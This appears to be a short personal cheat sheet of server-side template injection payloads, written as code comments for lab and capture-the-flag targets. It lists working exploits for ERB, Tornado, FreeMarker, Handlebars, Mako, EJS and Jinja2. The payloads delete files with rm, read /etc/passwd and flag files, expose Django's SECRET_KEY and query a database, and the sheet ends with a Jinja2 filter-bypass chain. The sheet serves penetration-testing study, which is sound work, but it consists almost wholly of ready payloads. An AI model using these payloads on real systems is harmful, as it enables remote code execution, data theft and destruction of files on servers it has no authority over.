// Server Side Template Injection
//! Exploiting
//* test
// ${{<%[%'"}}%\
// if this return an error it might be vulnerable
//* ERB
// <%= File.delete("morale.txt") %>
// <%= File.read("morale.txt") %>
// rce <%= system("rm /home/carlos/morale.txt") %>
//* tornado
// {% import os %}
// {{os.system('rm /home/carlos/morale.txt')
//* freemarker
// ${"freemarker.template.utility.Execute"?new()("rm  morale.txt")}
//* handlebars
// wrtz{{#with "s" as |string|}}
//   {{#with "e"}}
//       {{#with split as |conslist|}}
//           {{this.pop}}
//           {{this.push (lookup string.sub "constructor")}}
//           {{this.pop}}
//           {{#with string.split as |codelist|}}
//              {{this.pop}}
//              {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
//               {{this.pop}}
//               {{#each conslist}}
//                   {{#with (string.sub.apply 0 codelist)}}
//                      {{this}}
//                  {{/with}}
//               {{/each}}
//          {{/with}}
//       {{/with}}//  {{/with}}
// {{/with}}
//* django template engine
// {% debug %}
// {{settings.SECRET_KEY}}
//* java
// https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#velocity-java
//* python mako
// ${self.template.__init__.__globals__['os'].popen('cat+/flag.txt').read()}
//* GO
// https://payatu.com/blog/ssti-in-golang/
// { .methodname "param"}
// { call .funcname "param"}
//* ejs
// <%= global.process.mainModule.require('fs').readFileSync('/etc/passwd') %>
// <%- global.process.mainModule.require('./db.js').queryDb('SELECT * FROM santas_list').map(row=>row.first_name+row.last_name).join(" ") %>
//* python jinja2
// {{''.__class__.__mro__[2].__subclasses__()[40] ('flag.txt').read()}}
// if it didn't work try https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
//* filter bypass in python
// add the parameter  &filtered=*
// then request.args.filtered will be replace with *
// {{ object|attr(attribute_name) }} <==> {{ object.attribute_name }}
// for add _ to the name we can use ([request.args.filtered * 2 , "class" , request.args.filtered * 2] | join ) <==> __class__

// we end up with this :
// {{ ((''|attr([request.args.underscore * 2 , "class" , request.args.underscore * 2] | join) |
// attr([request.args.underscore * 2 , "mro" , request.args.underscore * 2] | join))[2]
// | attr([request.args.underscore * 2 , "subclasses" , request.args.underscore * 2] | join)())[40]('flag.txt).read()}}


